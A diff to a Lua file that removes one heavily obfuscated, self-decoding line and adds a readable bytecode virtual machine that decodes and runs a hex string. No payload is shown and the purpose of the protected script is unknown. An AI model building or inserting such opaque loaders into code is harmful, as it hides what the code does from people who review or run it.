@@ -1,1 +1,310 @@
-return(function(...)local D={"\100\114\089\069\122\119\055\111\043\120\100\114\073\082\072\074\071\114\049\061";"\103\074\078\066\103\121\061\061","\122\120\078\114\051\072\061\061","\107\049\078\111\067\082\103\070\122\078\043\110\051\114\066\052\047\119\078\101","\049\109\070\083\090\109\052\089\049\112\052\088\104\111\117\069\085\054\106\061","\103\114\043\117\067\074\069\099\088\076\043\077\107\053\069\099\043\074\121\061","\103\049\073\099\051\107\053\113\073\099\103\069\100\099\089\112\051\104\061\061","\043\120\115\104\067\120\100\105","\067\068\055\114\103\121\061\061";"\047\119\082\066\122\099\103\055","\085\054\087\079\103\120\069\061","\043\097\087\076\043\102\077\070\122\119\047\061";"\103\119\113\108\122\099\081\061";"\088\078\043\048\122\068\100\120\112\078\100\118\120\107\104\104\121\106\061\061";"\112\118\106\055\103\086\098\070\112\106\061\061";"\047\119\078\056\103\097\087\066";"\082\074\082\118\051\097\087\108\051\104\061\061";"\085\054\087\068\067\104\061\061","\043\097\087\056\043\120\054\118\103\085\081\061","\112\106\061\061";"\088\049\079\069\107\068\117\086\043\120\055\120\073\097\055\112\047\121\061\061","","\103\085\077\116\122\099\081\061";"\082\097\078\066\047\097\082\116\081\049\073\055\043\097\082\075\043\097\082\053\081\121\061\061","\103\099\100\054\067\106\061\061";"\122\111\049\061","\067\053\115\081\051\068\117\068\047\068\117\097\103\053\043\056\071\106\061\061","\067\074\089\089\047\106\061\061","\107\071\043\121\107\120\107\113\082\085\103\066\073\097\043\066\112\111\072\061","\043\097\078\118\122\097\107\061","\122\097\087\089\103\102\100\114\047\119\055\056\103\104\061\061","\071\102\043\050\088\114\100\119\047\114\100\073\047\107\070\097","\048\122\071\098\071\050\113\086\079\075\114\054\097\043\055\067\089\088\071\068\078\068\086\116\068\104\047\056\068\118\089\114\054\083\104\085\101\083\077\086\099\115\088\054\073\122\119\082\103\108\069\105\070\073\117\082\056\055\087\069\110\116\075\079\099\115\065\074\075\109\054\056\085\077\048\102\052\121\097\076\075\110\112\120\089\075\117\112\118\078\077\053\073\073\056\056\077\047\089\047\085\086\122\072\081\043\077\057\081\107\079\061","\067\099\089\101\048\075\073\086\122\085\117\099\043\076\073\115\122\106\061\061","\071\053\043\071\043\071\077\052\088\068\049\069\088\054\107\116";"\047\074\082\114\122\120\082\114\067\085\073\089\067\119\113\055","\047\099\073\116\051\120\115\068";"\122\111\081\061";"\100\085\078\108\088\049\043\097\103\120\077\110\051\055\121\061","\103\074\054\089\043\097\100\098";"\054\055\075\086\043\119\103\078\079\081\109\079\088\116\073\084\090\090\097\085\113\112\074\072\118\069\118\056\065\090\068\080\107\111\078\117\068\051\106\065\120\066\104\061";"\122\097\082\056";"\048\049\078\114\107\074\069\061";"\122\085\103\048\107\074\073\070\121\074\066\120\082\071\117\112";"\085\054\087\066\103\085\073\089\043\097\078\118\122\097\107\061","\120\075\073\074\103\102\100\088\103\072\061\061";"\047\097\100\089\122\097\104\061","\048\102\073\114\047\049\043\055\043\072\061\061";"\085\054\087\070\122\119\073\055\084\072\061\061";"\067\074\087\056\067\074\078\114";"\082\085\100\055\047\119\115\089\122\120\107\061"}for Y,L in ipairs({{-567154+567155;165336-165285};{-70498+70499,-832457-(-832506)};{653812+-653762,-837434+837485}})do while L[-772343-(-772344)]<L[749303+-749301]do D[L[974975-974974]],D[L[-38367-(-38369)]],L[303850-303849],L[1030848+-1030846]=D[L[-959038+959040]],D[L[-48225+48226]],L[295210-295209]+(83619+-83618),L[353515+-353513]-(903100+-903099)end end local function Y(Y)return D[Y+(-1048064+1109779)]end do local Y={K=-151845+151880;g=133437-133412,N=-762867-(-762872);["\048"]=-500318-(-500336);b=-710798-(-710838),["\056"]=1020288+-1020242;R=305342-305321,B=-324394+324439,d=-826861-(-826874),["\049"]=-387180+387184;["\054"]=-146597+146650,W=-257195-(-257256),H=17441+-17441,X=637556+-637544,A=634164+-634104;i=808633+-808590;I=879227+-879210,["\050"]=-958974+958989;t=-1040512+1040562,["\051"]=-718364-(-718390),Z=-688757+688799,a=-721654+721660;m=764406-764344,P=-973759-(-973822),G=154104-154085,u=-489006-(-489007);z=-123876+123903;v=912158-912124;c=-65195-(-65250);O=-499823+499867,T=-964734+964764,C=-292201+292225,r=680361-680309;Q=-245160+245168,w=67848-67810;V=442416-442414;["\052"]=1042752+-1042742,y=389484+-389468,l=-285114-(-285161);Y=299241+-299208;U=-332499-(-332522);h=804601+-804553,["\055"]=-689296-(-689333);e=595186+-595128,j=646420-646388;p=256694-256680,k=-198566+198586;q=-897468+897517,F=-637067-(-637108);M=430262-430253,E=781688+-781632,D=5280+-5241,x=-610099+610121;["\047"]=-406417-(-406445),n=206705-206694,["\057"]=134083-134052;["\043"]=997148-997119,o=422128-422125;S=876150-876091;f=-742128-(-742135),L=-653748+653799,J=98659+-98605;s=-626490-(-626547);["\053"]=-630260+630296}local L=type local X=table.concat local b=D local m=math.floor local u=table.insert local A=string.sub local s=string.char local y=string.len for D=40866-40865,#b,-544048-(-544049)do local J=b[D]if L(J)=="\115\116\114\105\110\103"then local L=y(J)local V={}local a=-790071-(-790072)local P=895996-895996 local M=-70626-(-70626)while a<=L do local D=A(J,a,a)local X=Y[D]if X then P=P+X*(-230183+230247)^((788216+-788213)-M)M=M+(613491+-613490)if M==-449898-(-449902)then M=899644-899644 local D=m(P/(-552497+618033))local Y=m((P%(-729145-(-794681)))/(-688885+689141))local L=P%(842682-842426)u(V,s(D,Y,L))P=831930+-831930 end elseif D=="\061"then u(V,s(m(P/(169445+-103909))))if a>=L or A(J,a+(-344746-(-344747)),a+(-89186-(-89187)))~="\061"then u(V,s(m((P%(953406+-887870))/(-378220-(-378476)))))end break end a=a+(-753143+753144)end b[D]=X(V)end end end return(function(D,X,b,m,u,A,s,j,v,w,J,P,g,o,y,M,L,a,V,h,I)v,o,g,V,a,h,L,J,P,y,j,M,I,w=function(D,Y)local X=P(Y)local b=function(b,m,u,A,s)return L(D,{b;m,u,A;s},Y,X)end return b end,function(D,Y)local X=P(Y)local b=function(b)return L(D,{b},Y,X)end return b end,function(D,Y)local X=P(Y)local b=function(b,m,u,A)return L(D,{b;m;u;A},Y,X)end return b end,function()a=a+(-884667+884668)J[a]=1011135+-1011134 return a end,-959678-(-959678),function(D,Y)local X=P(Y)local b=function()return L(D,{},Y,X)end return b end,function(L,b,m,u)local r,G,z,p,F,R,f,i,M,c,x,a,N,H,k,O,d,s,E,S,B,P,Z,t,T,l,w,e,C,J,U,n,Q,K while L do if L<945021+7891118 then if L<4494954-156901 then if L<2044002-144356 then if L<1516889-649652 then if L<1430750-725110 then if L<1274107-801913 then if L<928670-527472 then P=j(P)M=j(M)a=j(a)N=j(N)t=j(t)H=nil x=j(x)d=j(d)P=nil a=nil F=nil p=nil K=nil S=nil E=nil H=Y(645439-707126)w=j(w)K=Y(709414-771128)w=D[K]K=Y(-721980-(-660276))d=Y(-556785+495071)M=w[K]w=V()y[w]=M K=D[d]N=Y(-884155+822475)d=Y(866616-928317)p={}t=V()M=K[d]d=D[H]x=-203046-(-203302)H=Y(582633-644340)K=d[H]H=D[N]L=782584+7110649 N=Y(-808112-(-746423))d=H[N]F=V()S={}H=148261+-148261 N=V()y[N]=H H=766264+-766262 E=-125283-(-125284)y[t]=H H={}y[F]=p p=-106723-(-106723)z=x x=-754486-(-754487)O=x x=-122276+122276 U=O<x x=E-O else Z=y[a]L=Z and 15600893-(-4320)or 16519320-304809 r=Z end else y[a]=s L=7467460-502000 end else if L<321066+500384 then L=true L=L and 4584172-612979 or 93091+4245729 else L=-177381+2748211 end end else if L<2688097-984575 then if L<1687202-660852 then L=y[m[-716534+716535]]P=L a=b[833466+-833464]L=P[a]L=L and-604403+14821029 or 12105810-(-15648)J=b[1038592+-1038591]else J=y[m[852666+-852665]]s=#J J=386348+-386348 L=s==J L=L and-785144+16216783 or 2774196-(-776120)end else if L<-949757+2805880 then S=Y(-319466+257779)F=D[S]S=Y(-346870-(-285161))p=F[S]N=p L=-615027+13863432 else L=true s={}y[m[-401772+401773]]=L L=D[Y(-186098-(-124388))]end end end else if L<-12064+3505482 then if L<2200861-(-985919)then if L<3291565-439342 then if L<2504840-(-97571)then L=true L=L and 678645+15049963 or 834810+13353655 else L=y[m[-801977+801987]]a=y[m[759160+-759149]]J[L]=a L=y[m[-123876+123888]]a={L(J)}L=D[Y(-336746+275073)]s={X(a)}end else x=#S z=570034+-570034 E=x==z L=E and 11720774-58594 or 12767973-(-763576)end else if L<-202918+3566877 then J=Y(89699+-151393)L=D[J]a=y[m[-689461+689469]]P=539569+-539569 J=L(a,P)L=12136402-(-703926)else L=g(13609151-(-83171),{M})Z={L()}s={X(Z)}L=D[Y(672245+-733930)]end end else if L<613043+3132520 then if L<3831257-203302 then P=Y(83427+-145114)a=D[P]P=Y(312426+-374133)J=a[P]P=y[m[-109347+109348]]a={J(P)}L=D[Y(-55650+-6032)]s={X(a)}else L=-129828+239399 end else if L<3196225-(-837306)then J=Y(-1017728+956037)s=Y(-114660+52981)L=D[s]s=D[J]J=Y(927748-989439)D[J]=L L=1228549-450798 J=Y(622131+-683810)D[J]=s J=y[m[968126+-968125]]a=J()else p=-991487+991552 N=V()S=Y(110883+-172553)y[N]=s B=Y(-303729-(-242024))L=y[d]t=-667570-(-667573)s=L(t,p)t=V()E=o(7888145-827450,{})L=283625-283625 p=L y[t]=s L=122660-122660 F=L s=D[S]S={s(E)}s=80228-80226 L={X(S)}S=L L=S[s]E=L s=Y(57826-119524)L=D[s]x=y[P]Z=D[B]B=Z(E)Z=Y(-429293+367591)r=x(B,Z)x={r()}s=L(X(x))x=V()y[x]=s s=202854+-202853 r=y[t]Z=r r=-823546+823547 B=r r=978046+-978046 z=B<r L=742903+10784105 r=s-B end end end end else if L<4994390-(-471023)then if L<4912135-(-124644)then if L<5352479-705014 then if L<52770+4508359 then if L<4000157-(-339243)then s={}L=D[Y(-1012159+950456)]else s=C L=n L=1656978-1013887 end else L=947389+1623441 end else if L<5339578-457518 then t=t+p H=t<=N S=not F H=S and H S=t>=N S=F and S H=S or H S=989375+12677858 L=H and S H=526064+4365221 L=L or H else d=nil M=nil L=-444718+13417658 K=nil end end else if L<4962467-(-435117)then if L<4787058-(-521264)then L=y[m[83683+-83676]]L=L and-576818+3924888 or 12740581-(-99747)else K=y[w]L=9399296-764152 s=K end else if L<1021376+4434114 then P=779832+3167809 a=Y(-486447+424776)J=a^P s=9898639-(-273576)L=s-J s=Y(656628+-718302)J=L L=s/J s={L}L=D[Y(829562+-891245)]else P=63906+-63656 a=y[m[-485548-(-485551)]]J=a*P a=793722-793465 s=J%a L=13753284-686645 y[m[-100064-(-100067)]]=s end end end else if L<-98979+8345606 then if L<-55586+7251688 then if L<7951021-926077 then if L<-404205+6939991 then w=-282791-(-282793)a=y[m[-254695-(-254696)]]M=235048-235047 P=a(M,w)a=609716-609715 J=P==a L=J and-987455+13466812 or 461806+15372278 s=J else c=nil U=j(U)L=11641668-114660 T=j(T)R=j(R)G=j(G)O=j(O)i=j(i)end else s=9680263-(-247208)P=219367+16080139 a=Y(-714166+652488)J=a^P L=s-J s=Y(692518-754231)J=L L=s/J s={L}L=D[Y(-81346-(-19681))]end else if L<7929182-260840 then l=-124258-(-124260)e=c[l]l=y[T]Q=e==l L=3908823-(-583090)C=Q else R=not U x=x+O E=x<=z E=R and E R=x>=z R=U and R E=R or E R=9519427-346155 L=E and R E=145509+8295069 L=L or E end end else if L<9369501-698998 then if L<8112426-(-472175)then z=314538+-314538 L=917564+12613985 x=#S E=x==z else K=s d=Y(-7264+-54450)s=D[d]d=Y(-140132+78431)L=s[d]d=V()y[d]=L H=Y(81133-142820)F=Y(-139417-(-77730))s=D[H]H=Y(-479952-(-418285))L=s[H]H=L t=L p=D[F]N=p L=p and 1015422-(-727991)or 12223893-(-1024512)end else if L<9021847-297897 then Q=-770040+770041 L=8598566-(-1022208)n=c[Q]C=n else C=y[a]L=C and 8564517-(-373740)or-581874+1224965 s=C end end end end end else if L<12369071-(-581746)then if L<10072780-50082 then if L<10042186-716022 then if L<9695670-652916 then if L<29345+8931035 then if L<8026886-(-888956)then s=Y(-175013+113315)M=Y(-569401-(-507696))L=D[s]N=I(250152+5192574,{})J=y[m[886207-886203]]H=Y(908988+-970658)P=D[M]d=D[H]H={d(N)}K={X(H)}d=984833-984831 w=K[d]M=P(w)P=Y(-244264+182562)a=J(M,P)J={a()}s=L(X(J))J=s a=y[m[237863+-237858]]L=a and 12149394-(-694006)or 659124+9310332 s=a else n=L l=192230+-192229 e=c[l]l=false Q=e==l L=Q and 8259228-592818 or 4990328-498415 C=Q end else L=true L=561329+2866103 end else if L<732855+8373707 then s=Y(346543-408237)L=D[s]J=Y(-180774+119081)s=L(J)L=D[Y(966206+-1027917)]s={}else E=x R=E S[E]=R E=nil L=-692917+8586150 end end else if L<-91235+9939543 then if L<10045356-239911 then y[a]=C f=-453613-(-453614)l=y[i]e=l+f Q=c[e]n=p+Q Q=-431341-(-431597)L=n%Q e=y[R]Q=F+e e=-413421+413677 n=Q%e p=L F=n L=-379052+7344512 else N=-622067+622322 a=P H=-451950-(-451950)L=y[m[753848-753847]]d=L(H,N)J[a]=d L=-601459+13952779 a=nil end else if L<10844628-941757 then n=y[a]C=n L=n and-188838+8875695 or 10230681-609907 else L=-357611+5398405 J=nil y[m[469748-469743]]=s end end end else if L<769400+11437920 then if L<502576+11106207 then if L<999807+10510497 then if L<9855804-(-841146)then O=Y(-357924-(-296233))B=Y(909365-971070)L=D[B]z=D[O]B=L(z)L=Y(-627105-(-565426))D[L]=B L=-539377+5170558 else M=V()P=Y(-903868+842188)a=V()J=b L=true y[a]=L d=Y(89919-151589)w=V()s=D[P]P=Y(503749-565426)L=s[P]H=h(1128706-(-737591),{w})P=V()y[P]=L L=o(-927805+9984849,{})y[M]=L L=false y[w]=L K=D[d]d=K(H)L=d and 5985622-593074 or-332842+8967986 s=d end else r=r+B s=r<=Z O=not z s=O and s O=r>=Z O=z and O s=O or s O=15072+12211349 L=s and O s=695093-236327 L=L or s end else if L<-882235+12957902 then d=nil x=V()S=nil p=nil E={}y[x]=E O=V()z=o(1819736-277545,{x;N,t;w})E=V()R={}y[E]=z K=nil G=Y(-225063+163395)H=nil z={}y[O]=z U=Y(186022+-247703)Q=nil c=Y(366789-428461)K=Y(632870-694582)z=D[U]T=y[O]i={[G]=T,[c]=Q}U=z(R,i)d=-199974+20558488557552 z=v(-499503+1476428,{O;x;F,N,t;E})O=j(O)S=10805393464999-(-264360)P=z a=U x=j(x)t=j(t)M=nil w=j(w)F=j(F)N=j(N)H=19859461433641-336106 E=j(E)w=P(K,d)F=Y(-200600-(-138916))M=a[w]w=Y(491887+-553553)d=Y(271912+-333588)D[w]=M K=P(d,H)w=a[K]K=Y(-712566+650866)d=Y(360439-422125)D[K]=w N=Y(-229317-(-167653))K=D[d]H=D[N]p=P(F,S)L=D[Y(482543+-544231)]t=a[p]s={}P=nil p=Y(-1094629-(-1032960))p=H[p]N={p(H,t)}d=K(X(N))K=d()a=nil else L={}d=-565554+565809 y[m[289643-289641]]=L s=y[m[-19358-(-19361)]]M=s w=306409+35184371782423 s=a%w y[m[-199142+199146]]=s K=a%d d=741303+-741301 H=Y(1000319+-1061999)w=K+d y[m[-1015871+1015876]]=w d=D[H]t=574706+-574705 H=Y(184614+-246289)L=-91043+4936759 K=d[H]d=K(J)K=Y(-784309-(-722614))P[a]=K H=532658-532657 N=d K=80464-80226 p=t t=39265+-39265 F=p<t t=H-p end end else if L<-67298+12854153 then if L<-230439+12622809 then U=Y(837290-899004)O=V()y[O]=r R=555733-555633 s=D[U]U=Y(881403+-943104)L=s[U]U=690934-690933 s=L(U,R)R=279529+-279529 U=V()y[U]=s L=y[d]i=1004222-1003967 s=L(R,i)T=981439-981438 i=342252-342251 R=V()c=-848568-(-848570)y[R]=s L=y[d]G=y[U]s=L(i,G)i=V()y[i]=s f=-671669+671669 s=y[d]G=s(T,c)c=Y(-104994-(-43297))s=617716-617715 L=G==s s=Y(163365+-225067)k=-54354-(-64354)Q=Y(-179501-(-117796))G=V()y[G]=L n=D[Q]e=y[d]l={e(f,k)}Q=n(X(l))n=Y(1023680+-1085377)L=Y(514230-575922)C=Q..n T=c..C L=E[L]L=L(E,s,T)T=V()C=v(-895740+6378403,{d;O;t;P,a,x,G,T,U,i,R,N})y[T]=L c=Y(512944+-574614)s=D[c]c={s(C)}L={X(c)}c=L L=y[G]L=L and 539569+8230235 or 9462017-(-389164)else L=s and-28833+8939953 or 5621068-580274 end else if L<13357384-515248 then P=y[m[-652148+652157]]L={}a=-773175-(-773176)M=P P=-644916+644917 J=L w=P P=-505584-(-505584)L=13636417-285097 K=w<P P=a-w else P=y[m[-150565+150571]]L=115236+9854220 a=P==J s=a end end end end else if L<-831802+15010473 then if L<13626308-16289 then if L<396716+12886776 then if L<12441692-(-669941)then if L<-236455+13233058 then L=D[Y(271530-333226)]s={a}else a=y[m[506288+-506285]]P=950077+-950076 J=a~=P L=J and 13668545-(-123108)or-248680+5709326 end else s=N L=t L=N and 386988+3912919 or 16390101-(-233511)end else if L<30945+13435492 then d=not K P=P+w a=P<=M a=d and a d=P>=M d=K and d a=d or a d=-166309+9986257 L=a and d a=396396+2245092 L=L or a else x=493487+-493486 z=#S E=M(x,z)x=K(S,E)L=2898936-(-203878)z=y[F]E=nil R=214951+-214950 U=x-R O=d(U)z[x]=O x=nil end end else if L<-541425+14238658 then if L<13434296-(-240231)then H=t B=Y(278203-339883)Z=D[B]B=Y(153307-215015)r=Z[B]Z=r(J,H)r=y[m[515510-515504]]B=r()x=Z+B E=x+K x=-240871+241127 S=E%x K=S H=nil x=P[a]B=147430-147429 Z=K+B r=M[Z]E=x..r L=818233+4027483 P[a]=E else L=793977+-16226 end else if L<-377836+14208914 then a=y[m[-28961+28964]]P=-258376-(-258408)J=a%P N=246632+-246630 M=y[m[-296677-(-296681)]]p=558129+-558116 d=y[m[630774-630772]]E=y[m[-340776-(-340779)]]S=E-J E=497615-497583 F=S/E t=p-F H=N^t K=d/H H=825659-825658 w=M(K)M=-251816+4295219112 P=w%M w=809211-809209 N=-76834-(-77090)M=w^J a=P/M M=y[m[1003075-1003071]]L=4101533-551217 d=a%H J=nil H=-956990+4295924286 K=d*H w=M(K)M=y[m[44453-44449]]K=M(a)P=w+K w=-463214+528750 M=P%w d=715892-650356 K=P-M w=K/d p=-467182-(-467438)P=nil d=-288169+288425 K=M%d H=M-K d=H/N N=862459-862203 H=w%N t=w-H N=t/p a=nil M=nil w=nil t={K;d;H,N}y[m[-551153+551154]]=t K=nil N=nil d=nil H=nil else z=Y(-657844+596165)L=D[z]z=Y(963838+-1025529)D[z]=L L=4396710-(-234471)end end end else if L<16004012-313834 then if L<120996+14671192 then if L<-619827+14835172 then if L<-710454+14910306 then s={}L=D[Y(-1105722-(-1044032))]else L=true L=L and-155045+989118 or 4342116-914684 end else L=13614848-641908 end else if L<14529588-(-1021504)then a=y[m[-937469+937471]]P=-262019-(-262120)J=a*P a=-1010303+2397739676472 s=J+a J=133924+35184371954908 a=-572786+572787 L=s%J y[m[-530926-(-530928)]]=L L=4560426-(-900220)J=y[m[249387-249384]]s=J~=a else Z=p==F r=Z L=16827362-612851 end end else if L<15610872-(-256232)then if L<819129+15003457 then L=y[d]B=400556+-400555 z=656564+-656558 Z=L(B,z)z=Y(-1023725-(-962046))L=Y(-247957-(-186278))D[L]=Z B=D[z]z=-233061-(-233063)L=B>z L=L and-465902+10627364 or 708150+13466491 else a=y[m[-301799-(-301801)]]P=y[m[-890364+890367]]J=a==P L=527152+11952205 s=J end else if L<16127899-(-232551)then y[a]=r L=y[a]L=L and 2904888-(-816441)or-694390+9656200 else t=Y(797241+-858950)N=D[t]s=N L=4571307-271400 end end end end end end end L=#u return X(s)end,{},function(D)for Y=709047-709046,#D,-802937+802938 do J[D[Y]]=(-717429-(-717430))+J[D[Y]]end if b then local L=b(true)local X=u(L)X[Y(926939-988607)],X[Y(-10016+-51683)],X[Y(101531-163237)]=D,M,function()return 748023+-778104 end return L else return m({},{[Y(-833531-(-771832))]=M;[Y(851322+-912990)]=D,[Y(639404-701110)]=function()return 63714+-93795 end})end end,{},function(D)J[D]=J[D]-(832826+-832825)if J[D]==97635-97635 then J[D],y[D]=nil,nil end end,function(D)local Y,L=1005760-1005759,D[1042048+-1042047]while L do J[L],Y=J[L]-(224808-224807),Y+(-627186-(-627187))if J[L]==835962+-835962 then J[L],y[L]=nil,nil end L=D[Y]end end,function(D,Y)local X=P(Y)local b=function(b,m,u)return L(D,{b;m,u},Y,X)end return b end,function(D,Y)local X=P(Y)local b=function(...)return L(D,{...},Y,X)end return b end return(w(10360732-(-618931),{}))(X(s))end)(getfenv and getfenv()or _ENV,unpack or table[Y(303017+-364726)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
+local StrToNumber = tonumber;
+local Byte = string.byte;
+local Char = string.char;
+local Sub = string.sub;
+local Subg = string.gsub;
+local Rep = string.rep;
+local Concat = table.concat;
+local Insert = table.insert;
+local LDExp = math.ldexp;
+local GetFEnv = getfenv or function()
+	return _ENV;
+end;
+local Setmetatable = setmetatable;
+local PCall = pcall;
+local Select = select;
+local Unpack = unpack or table.unpack;
+local ToNumber = tonumber;
+local function VMCall(ByteString, vmenv, ...)
+	local DIP = 1;
+	local repeatNext;
+	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
+		if (Byte(byte, 2) == 81) then
+			repeatNext = StrToNumber(Sub(byte, 1, 1));
+			return "";
+		else
+			local a = Char(StrToNumber(byte, 16));
+			if repeatNext then
+				local b = Rep(a, repeatNext);
+				repeatNext = nil;
+				return b;
+			else
+				return a;
+			end
+		end
+	end);
+	local function gBit(Bit, Start, End)
+		if End then
+			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
+			return Res - (Res % 1);
+		else
+			local Plc = 2 ^ (Start - 1);
+			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
+		end
+	end
+	local function gBits8()
+		local a = Byte(ByteString, DIP, DIP);
+		DIP = DIP + 1;
+		return a;
+	end
+	local function gBits16()
+		local a, b = Byte(ByteString, DIP, DIP + 2);
+		DIP = DIP + 2;
+		return (b * 256) + a;
+	end
+	local function gBits32()
+		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
+		DIP = DIP + 4;
+		return (d * 16777216) + (c * 65536) + (b * 256) + a;
+	end
+	local function gFloat()
+		local Left = gBits32();
+		local Right = gBits32();
+		local IsNormal = 1;
+		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
+		local Exponent = gBit(Right, 21, 31);
+		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
+		if (Exponent == 0) then
+			if (Mantissa == 0) then
+				return Sign * 0;
+			else
+				Exponent = 1;
+				IsNormal = 0;
+			end
+		elseif (Exponent == 2047) then
+			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
+		end
+		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
+	end
+	local function gString(Len)
+		local Str;
+		if not Len then
+			Len = gBits32();
+			if (Len == 0) then
+				return "";
+			end
+		end
+		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
+		DIP = DIP + Len;
+		local FStr = {};
+		for Idx = 1, #Str do
+			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
+		end
+		return Concat(FStr);
+	end
+	local gInt = gBits32;
+	local function _R(...)
+		return {...}, Select("#", ...);
+	end
+	local function Deserialize()
+		local Instrs = {};
+		local Functions = {};
+		local Lines = {};
+		local Chunk = {Instrs,Functions,nil,Lines};
+		local ConstCount = gBits32();
+		local Consts = {};
+		for Idx = 1, ConstCount do
+			local Type = gBits8();
+			local Cons;
+			if (Type == 1) then
+				Cons = gBits8() ~= 0;
+			elseif (Type == 2) then
+				Cons = gFloat();
+			elseif (Type == 3) then
+				Cons = gString();
+			end
+			Consts[Idx] = Cons;
+		end
+		Chunk[3] = gBits8();
+		for Idx = 1, gBits32() do
+			local Descriptor = gBits8();
+			if (gBit(Descriptor, 1, 1) == 0) then
+				local Type = gBit(Descriptor, 2, 3);
+				local Mask = gBit(Descriptor, 4, 6);
+				local Inst = {gBits16(),gBits16(),nil,nil};
+				if (Type == 0) then
+					Inst[3] = gBits16();
+					Inst[4] = gBits16();
+				elseif (Type == 1) then
+					Inst[3] = gBits32();
+				elseif (Type == 2) then
+					Inst[3] = gBits32() - (2 ^ 16);
+				elseif (Type == 3) then
+					Inst[3] = gBits32() - (2 ^ 16);
+					Inst[4] = gBits16();
+				end
+				if (gBit(Mask, 1, 1) == 1) then
+					Inst[2] = Consts[Inst[2]];
+				end
+				if (gBit(Mask, 2, 2) == 1) then
+					Inst[3] = Consts[Inst[3]];
+				end
+				if (gBit(Mask, 3, 3) == 1) then
+					Inst[4] = Consts[Inst[4]];
+				end
+				Instrs[Idx] = Inst;
+			end
+		end
+		for Idx = 1, gBits32() do
+			Functions[Idx - 1] = Deserialize();
+		end
+		return Chunk;
+	end
+	local function Wrap(Chunk, Upvalues, Env)
+		local Instr = Chunk[1];
+		local Proto = Chunk[2];
+		local Params = Chunk[3];
+		return function(...)
+			local Instr = Instr;
+			local Proto = Proto;
+			local Params = Params;
+			local _R = _R;
+			local VIP = 1;
+			local Top = -1;
+			local Vararg = {};
+			local Args = {...};
+			local PCount = Select("#", ...) - 1;
+			local Lupvals = {};
+			local Stk = {};
+			for Idx = 0, PCount do
+				if (Idx >= Params) then
+					Vararg[Idx - Params] = Args[Idx + 1];
+				else
+					Stk[Idx] = Args[Idx + 1];
+				end
+			end
+			local Varargsz = (PCount - Params) + 1;
+			local Inst;
+			local Enum;
+			while true do
+				Inst = Instr[VIP];
+				Enum = Inst[1];
+				if (Enum <= 6) then
+					if (Enum <= 2) then
+						if (Enum <= 0) then
+							local A = Inst[2];
+							local T = Stk[A];
+							for Idx = A + 1, Inst[3] do
+								Insert(T, Stk[Idx]);
+							end
+						elseif (Enum > 1) then
+							Stk[Inst[2]] = Inst[3];
+						else
+							local A = Inst[2];
+							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
+							Top = (Limit + A) - 1;
+							local Edx = 0;
+							for Idx = A, Top do
+								Edx = Edx + 1;
+								Stk[Idx] = Results[Edx];
+							end
+						end
+					elseif (Enum <= 4) then
+						if (Enum > 3) then
+							Stk[Inst[2]] = Env[Inst[3]];
+						else
+							local A = Inst[2];
+							local B = Stk[Inst[3]];
+							Stk[A + 1] = B;
+							Stk[A] = B[Inst[4]];
+						end
+					elseif (Enum > 5) then
+						Stk[Inst[2]] = {};
+					else
+						do
+							return;
+						end
+					end
+				elseif (Enum <= 9) then
+					if (Enum <= 7) then
+						local A = Inst[2];
+						Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
+					elseif (Enum == 8) then
+						local Edx;
+						local Results, Limit;
+						local B;
+						local A;
+						Stk[Inst[2]] = Inst[3];
+						VIP = VIP + 1;
+						Inst = Instr[VIP];
+						Env[Inst[3]] = Stk[Inst[2]];
+						VIP = VIP + 1;
+						Inst = Instr[VIP];
+						Stk[Inst[2]] = Inst[3];
+						VIP = VIP + 1;
+						Inst = Instr[VIP];
+						Env[Inst[3]] = Stk[Inst[2]];
+						VIP = VIP + 1;
+						Inst = Instr[VIP];
+						Stk[Inst[2]] = Env[Inst[3]];
+						VIP = VIP + 1;
+						Inst = Instr[VIP];
+						Stk[Inst[2]] = Env[Inst[3]];
+						VIP = VIP + 1;
+						Inst = Instr[VIP];
+						A = Inst[2];
+						B = Stk[Inst[3]];
+						Stk[A + 1] = B;
+						Stk[A] = B[Inst[4]];
+						VIP = VIP + 1;
+						Inst = Instr[VIP];
+						Stk[Inst[2]] = Inst[3];
+						VIP = VIP + 1;
+						Inst = Instr[VIP];
+						Stk[Inst[2]] = Inst[3] ~= 0;
+						VIP = VIP + 1;
+						Inst = Instr[VIP];
+						A = Inst[2];
+						Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
+						Top = (Limit + A) - 1;
+						Edx = 0;
+						for Idx = A, Top do
+							Edx = Edx + 1;
+							Stk[Idx] = Results[Edx];
+						end
+					else
+						local B;
+						local T;
+						local A;
+						Stk[Inst[2]] = {};
+						VIP = VIP + 1;
+						Inst = Instr[VIP];
+						Stk[Inst[2]] = Inst[3];
+						VIP = VIP + 1;
+						Inst = Instr[VIP];
+						Stk[Inst[2]] = Inst[3];
+						VIP = VIP + 1;
+						Inst = Instr[VIP];
+						Stk[Inst[2]] = Inst[3];
+						VIP = VIP + 1;
+						Inst = Instr[VIP];
+						A = Inst[2];
+						T = Stk[A];
+						B = Inst[3];
+						for Idx = 1, B do
+							T[Idx] = Stk[A + Idx];
+						end
+					end
+				elseif (Enum <= 11) then
+					if (Enum == 10) then
+						Stk[Inst[2]] = Inst[3] ~= 0;
+					else
+						Env[Inst[3]] = Stk[Inst[2]];
+					end
+				elseif (Enum == 12) then
+					local A = Inst[2];
+					local T = Stk[A];
+					local B = Inst[3];
+					for Idx = 1, B do
+						T[Idx] = Stk[A + Idx];
+					end
+				else
+					Stk[Inst[2]]();
+				end
+				VIP = VIP + 1;
+			end
+		end;
+	end
+	return Wrap(Deserialize(), {}, vmenv)(...);
+end
